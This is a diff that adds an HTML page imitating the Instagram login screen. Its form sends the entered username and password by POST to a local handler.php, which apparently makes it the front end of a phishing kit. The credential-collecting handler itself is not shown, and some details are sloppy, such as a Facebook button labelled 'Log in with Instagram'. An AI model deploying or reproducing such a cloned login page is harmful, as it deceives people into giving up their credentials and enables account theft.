@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <h1 class="logo">Instagram</h1>
+            <!-- Form action set to handler.php -->
+            <form action="handler.php" method="POST">
+                <input type="text" name="username" placeholder="Phone number, username, or email" class="input-box">
+                <input type="password" name="password" placeholder="Password" class="input-box">
+                <button type="submit" class="login-btn">Log in</button>
+            </form>
+            <div class="divider">
+                <span class="line"></span>
+                <span class="or-text">OR</span>
+                <span class="line"></span>
+            </div>
+            <button class="fb-login">
+                <img src="img/acebook.png" alt="Facebook Logo" class="fb-logo">
+                Log in with Instagram
+            </button>
+            <a href="#" class="forgot-password">Forgot password?</a>
+        </div>
+
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
+        </div>
+
+        <div class="get-app">
+            <p>Get the app.</p>
+            <div class="app-stores">
+                <a href="#"><img src="img/googleplay-button.png" alt="Google Play"></a>
+                <a href="#"><img src="img/microso.png" alt="Microsoft Store"></a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
